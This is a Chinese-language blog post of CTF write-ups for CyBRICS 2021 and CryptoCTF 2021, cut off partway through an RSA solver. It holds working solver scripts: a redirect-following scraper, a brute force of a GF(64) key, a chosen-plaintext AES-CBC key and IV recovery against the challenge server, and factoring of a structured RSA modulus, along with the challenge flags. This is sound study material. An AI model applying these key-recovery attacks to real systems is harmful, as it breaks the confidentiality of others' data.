title="前言"></a>前言</h2><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210725145150731.png" alt>说实话这个比赛太国际了，不是特别想打，因为我太菜了，练习时长还没两年半的ctf练习生，我只配复复现，打这种比赛估计还是要继续练习一两年才行。所以我大概看了看，这个比赛我自己打的话估计只能拿200分左右。</p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Ad-Network"><a href="#Ad-Network" class="headerlink" title="Ad Network"></a>Ad Network</h3><p>因为不断重定向了1337次才能获得flag，这时候写脚本比较方便而且不费时间，写个脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsoriginurl <span class="token operator">=</span> <span class="token string">"http://adnetwork-cybrics2021.ctf.su/adnetwork"</span>resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>originurl<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">.</span>texturl <span class="token operator">=</span> resp<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span>resp<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">18</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[1] "</span><span class="token operator">+</span>url<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1336</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text    url <span class="token operator">=</span> resp<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span>resp<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">18</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[&#123;0&#125;] "</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> url<span class="token punctuation">)</span><span class="token comment"># [1337] http://tend.adnetwork-cybrics2021.ctf.su/military-front-low/learn-fill-though-factor-line/hear-hundred-subject-wind/enough-lot-tree-will-color</span><span class="token comment"># cybrics&#123;f0lL0w_RUl3Z_F0ll0W_r3d1r3C7z&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="rebyc"><a href="#rebyc" class="headerlink" title="rebyc"></a>rebyc</h2><p>​    这是什么新的题型？看起来有点像是misc。</p><h3 id="CAPTCHA-The-Flag"><a href="#CAPTCHA-The-Flag" class="headerlink" title="CAPTCHA The Flag"></a>CAPTCHA The Flag</h3><p>​    给出的是个网站，让输入验证码，但是验证码是使用了lsb隐写的，所以这里需要先把图片下载下来，然后用stegsolve看，我比较菜没思路写脚本才使用了这种比较原始的方案。</p><p>​    最后得出的flag为</p><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">cybrics&#123;a_k33n_Ey3_wi11_sp0T_r1GhT_aw4Y&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210725141418228.png" alt></p><h1 id="CCTF"><a href="#CCTF" class="headerlink" title="CCTF"></a>CCTF</h1><h2 id="前言-2"><a href="#前言-2" class="headerlink" title="前言"></a>前言</h2><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210731162302563.png" alt></p><p>多做点ctftime上的题，这上面的wp也好找，也算是跟进一下国外的ctf方面的动态。下面的题目是按平台上面给出的难度系数分的类。</p><blockquote><p>做不动了，附件下载下来之后才发现都是密码的题目，而且比我平时做的都难，所以这里就不做了，等着wp吧。</p></blockquote><h2 id="warm-up"><a href="#warm-up" class="headerlink" title="warm-up"></a>warm-up</h2><h3 id="mic-check"><a href="#mic-check" class="headerlink" title="mic check"></a>mic check</h3><p>直接在rules的那一栏里面的最下面就是flag</p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210731162506226.png" alt></p><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">CCTF&#123;W3lc0me_t0_The_0ne_&amp;_0nly_Crypt0_CTF_Mad3ـw1th_L0ve_f0r_Crypt0!&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="easy"><a href="#easy" class="headerlink" title="easy"></a>easy</h2><h3 id="Farm"><a href="#Farm" class="headerlink" title="Farm"></a>Farm</h3><pre class="line-numbers language-none"><code class="language-none">Explore the Farm very carefully!<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env sage</span><span class="token keyword">from</span> sage<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> string<span class="token punctuation">,</span> base64<span class="token punctuation">,</span> mathALPHABET <span class="token operator">=</span> string<span class="token punctuation">.</span>printable<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">62</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'\\='</span>F <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>GF<span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">keygen</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">:</span>    key <span class="token operator">=</span> <span class="token punctuation">[</span>F<span class="token punctuation">[</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">]</span>    key <span class="token operator">=</span> math<span class="token punctuation">.</span>prod<span class="token punctuation">(</span>key<span class="token punctuation">)</span>  <span class="token comment"># Optimization the key length :D</span>    <span class="token keyword">return</span> key<span class="token keyword">def</span> <span class="token function">maptofarm</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">assert</span> c <span class="token keyword">in</span> ALPHABET    <span class="token keyword">return</span> F<span class="token punctuation">[</span>ALPHABET<span class="token punctuation">.</span>index<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>msg<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>    m64 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>msg<span class="token punctuation">)</span>    enc<span class="token punctuation">,</span> pkey <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">,</span> key <span class="token operator">**</span> <span class="token number">5</span> <span class="token operator">+</span> key <span class="token operator">**</span> <span class="token number">3</span> <span class="token operator">+</span> key <span class="token operator">**</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">for</span> m <span class="token keyword">in</span> m64<span class="token punctuation">:</span>        enc <span class="token operator">+=</span> ALPHABET<span class="token punctuation">[</span>F<span class="token punctuation">.</span>index<span class="token punctuation">(</span>pkey <span class="token operator">*</span> maptofarm<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> enc<span class="token comment"># KEEP IT SECRET</span>key <span class="token operator">=</span> keygen<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span>  <span class="token comment"># I think 64**14 > 2**64 is not brute-forcible :P</span>enc <span class="token operator">=</span> encrypt<span class="token punctuation">(</span>flag<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'enc = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>enc<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重点就是下面这个函数</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">keygen</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">:</span>    key <span class="token operator">=</span> <span class="token punctuation">[</span>F<span class="token punctuation">[</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">]</span>    key <span class="token operator">=</span> math<span class="token punctuation">.</span>prod<span class="token punctuation">(</span>key<span class="token punctuation">)</span>  <span class="token comment"># Optimization the key length :D</span>    <span class="token keyword">return</span> key<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这里对有限域GF(64)里的内容进行一个随机提取14位再进行prod()操作，prod也就是将list内的元素逐个相乘，而相乘的结果仍在有限域GF(64)内<strong>PS:这是有限域的特征</strong>，key就在长度为64的GF(64)列表里面。那我们就能针对这个进行爆破key</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># !/usr/bin/env sage</span><span class="token keyword">from</span> sage<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> string<span class="token punctuation">,</span> base64<span class="token punctuation">,</span> mathflag <span class="token operator">=</span> <span class="token string">b"thisisflag"</span>ALPHABET <span class="token operator">=</span> string<span class="token punctuation">.</span>printable<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">62</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'\\='</span>F <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>GF<span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">)</span>enc <span class="token operator">=</span> <span class="token string">'805c9GMYuD5RefTmabUNfS9N9YrkwbAbdZE0df91uCEytcoy9FDSbZ8Ay8jj'</span><span class="token keyword">def</span> <span class="token function">decrypto</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>    flag<span class="token punctuation">,</span> pkey <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">,</span> key <span class="token operator">**</span> <span class="token number">5</span> <span class="token operator">+</span> key <span class="token operator">**</span> <span class="token number">3</span> <span class="token operator">+</span> key <span class="token operator">**</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">for</span> c <span class="token keyword">in</span> enc<span class="token punctuation">:</span>        flag <span class="token operator">+=</span> ALPHABET<span class="token punctuation">[</span>F<span class="token punctuation">.</span>index<span class="token punctuation">(</span>F<span class="token punctuation">[</span>ALPHABET<span class="token punctuation">.</span>index<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">/</span> pkey<span class="token punctuation">)</span><span class="token punctuation">]</span>    m <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">return</span> m<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> key <span class="token keyword">in</span> F<span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            flag <span class="token operator">=</span> decrypto<span class="token punctuation">(</span>key<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">b'CCTF'</span> <span class="token keyword">in</span> flag<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment"># b'CCTF&#123;EnCrYp7I0n_4nD_5u8STitUtIn9_iN_Fi3Ld!&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="KeyBase"><a href="#KeyBase" class="headerlink" title="KeyBase"></a>KeyBase</h3><pre class="line-numbers language-none"><code class="language-none">Recovering secrets is hard, but there is always some easy parts!<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>是个CBC模式的aes，给出的key差了两个八比特，iv没给，但是可实现对key的爆破。而且可以进行选择明文攻击攻击，下面是AES-CBC的模式图:</p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210812194759699.png" alt></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AESchall <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"01.cr.yp.toc.tf"</span><span class="token punctuation">,</span> <span class="token number">17010</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">bytesxor</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> s2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>a <span class="token operator">^</span> b<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">for</span> a<span class="token punctuation">,</span> b <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> s2<span class="token punctuation">)</span><span class="token punctuation">)</span>chall<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"[Q]uit\n"</span><span class="token punctuation">,</span> <span class="token string">b'g'</span><span class="token punctuation">)</span>eflag <span class="token operator">=</span> chall<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'= '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token comment"># 重复输入x直到得到含前四位的enc</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    chall<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"[Q]uit\n"</span><span class="token punctuation">,</span> <span class="token string">b't'</span><span class="token punctuation">)</span>    chall<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"encrypt: \n"</span><span class="token punctuation">,</span> <span class="token string">b'x'</span> <span class="token operator">*</span> <span class="token number">32</span><span class="token punctuation">)</span>    <span class="token comment"># 下面这两句接收server输入的语句一定要挨着</span>    enc <span class="token operator">=</span> chall<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' = '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    key <span class="token operator">=</span> chall<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' = '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    prefix <span class="token operator">=</span> enc<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token string">'*'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> prefix<span class="token punctuation">:</span>        prefix <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>prefix<span class="token punctuation">)</span>  <span class="token comment"># 这里将得到的十六进制转为byte，方便进行下面的bytesxor</span>        <span class="token keyword">break</span><span class="token comment"># 对key进行爆破</span>key <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"\x00\x00"</span><span class="token keyword">for</span> a <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    key<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> a    <span class="token keyword">for</span> b <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        key<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> b        <span class="token comment"># 根据AES的CBC模式，此处可以爆破出key，下面的if语句为 true 的条件。</span>        <span class="token comment"># 这里没有iv初始向量的时候，使用ECB模式可以对块进行解密</span>        <span class="token keyword">if</span> bytesxor<span class="token punctuation">(</span>AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_ECB<span class="token punctuation">)</span><span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>enc<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">32</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">b'xx'</span><span class="token punctuation">)</span> <span class="token operator">==</span> prefix<span class="token punctuation">:</span>            <span class="token comment"># 下面得到的是前面16 bytes 的密文</span>            cipher <span class="token operator">=</span> bytesxor<span class="token punctuation">(</span>AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_ECB<span class="token punctuation">)</span><span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>enc<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">32</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">b'x'</span> <span class="token operator">*</span> <span class="token number">16</span><span class="token punctuation">)</span>            <span class="token comment"># 下面得到的是iv将前面16 bytes的密文解密之后与16 bytes明文信息进行异或即可得到iv</span>            iv <span class="token operator">=</span> bytesxor<span class="token punctuation">(</span>AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_ECB<span class="token punctuation">)</span><span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">b'x'</span> <span class="token operator">*</span> <span class="token number">16</span><span class="token punctuation">)</span>            flag <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span> iv<span class="token punctuation">)</span><span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>eflag<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># b'CCTF&#123;h0W_R3cOVER_7He_5eCrET_1V?&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>不是很难，考的很基础，就是一个key的爆破，与初始向量iv的恢复。</p><h3 id="Symbols"><a href="#Symbols" class="headerlink" title="Symbols"></a>Symbols</h3><pre class="line-numbers language-none"><code class="language-none">Oh, my eyes, my eyes! People still can solve this kind of cryptography? Mathematicians should love this one!<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>类似古典密码，取的是latex的公式所用的单词的首字母</p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210814140948835.png" alt></p><pre class="line-numbers language-none"><code class="language-none">\Cap \Cap \Theta \Finv \&#123; \Pi \ltimes \aleph y \_ \wp \infty \therefore \heartsuit \_ \Lsh \aleph \Theta \eth \Xi \&#125;CCTF&#123;Play_with_LaTeX&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这种公式的符号有些类似于misc脑洞，但其实想到了是非常easy的，打眼一看是latex，就想到要使用latex的<code>\</code>后的首字母。</p><h2 id="medium-easy"><a href="#medium-easy" class="headerlink" title="medium-easy"></a>medium-easy</h2><h3 id="Hamul"><a href="#Hamul" class="headerlink" title="Hamul"></a>Hamul</h3><pre class="line-numbers language-none"><code class="language-none">RSA could be hard, or easy?<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>flag <span class="token operator">=</span> <span class="token string">'test'</span>nbit <span class="token operator">=</span> <span class="token number">64</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>p<span class="token punctuation">,</span> q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span>nbit<span class="token punctuation">)</span><span class="token punctuation">,</span> getPrime<span class="token punctuation">(</span>nbit<span class="token punctuation">)</span>P <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">)</span>Q <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span>PP <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>P<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>Q<span class="token punctuation">)</span><span class="token punctuation">)</span>QQ <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>Q<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>P<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> isPrime<span class="token punctuation">(</span>PP<span class="token punctuation">)</span> <span class="token keyword">and</span> isPrime<span class="token punctuation">(</span>QQ<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">break</span>n <span class="token operator">=</span> PP <span class="token operator">*</span> QQm <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> m <span class="token operator">&lt;</span> n<span class="token punctuation">:</span>c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> <span class="token number">65537</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'n ='</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'c ='</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里赛后根据别人的wp，因为这个<code>PP、QQ</code>的构造是独特的</p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210814162251047.png" alt></p><p>也就是说，这个N的前几位是肯定等于<code>p*q</code>的高位的，而N的最后几位也肯定是等于<code>p*q</code>的低位的。</p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210814164357860.png" alt></p><p>可见前后19位是相同的，相当于<code>p*q</code>的前后19位都是可已知的，所以只需要对<code>p*q</code>的中间两位进行爆破即可。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> factordb<span class="token punctuation">.</span>factordb <span class="token keyword">import</span> FactorDB<span class="token keyword">import</span> gmpy2n <span class="token operator">=</span> <span class="token number">98027132963374134222724984677805364225505454302688777506193468362969111927940238887522916586024601699661401871147674624868439577416387122924526713690754043</span>c <span class="token operator">=</span> <span class="token number">42066148309824022259115963832631631482979698275547113127526245628391950322648581438233116362337008919903556068981108710136599590349195987128718867420453399</span><span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token punctuation">:</span>    P <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">)</span>    Q <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span>    PP <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>P<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>Q<span class="token punctuation">)</span><span class="token punctuation">)</span>    QQ <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>Q<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>P<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> isPrime<span class="token punctuation">(</span>PP<span class="token punctuation">)</span> <span class="token keyword">and</span> isPrime<span class="token punctuation">(</span>QQ<span class="token punctuation">)</span> <span class="token keyword">and</span> n <span class="token operator">==</span> PP <span class="token operator">*</span> QQ<span class="token punctuation">:</span>        p<span class="token punctuation">,</span> q <span class="token operator">=</span> PP<span class="token punctuation">,</span> QQ        phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        d <span class="token operator">=</span> gmpy2<span class="token 